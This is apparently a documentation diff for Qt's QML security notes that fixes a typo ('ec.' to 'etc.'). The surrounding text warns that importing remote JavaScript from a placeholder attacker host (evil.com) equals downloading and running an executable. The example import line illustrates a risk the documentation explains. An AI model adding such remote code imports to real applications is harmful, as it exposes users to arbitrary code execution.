@@ -48,7 +48,7 @@ import "http://evil.com/evil.js" as Evil
 is equivalent to downloading "http://evil.com/evil.exe" and running it. The JavaScript execution
 environment of QML does not try to stop any particular accesses, including local file system
 access, just as for any native Qt application, so the "doEvil" function could do the same things
-as a native Qt application, a Python application, a Perl script, ec.
+as a native Qt application, a Python application, a Perl script, etc.
 
 As with any application accessing other content beyond it's control, a QML application should
 perform appropriate checks on untrusted data it loads.
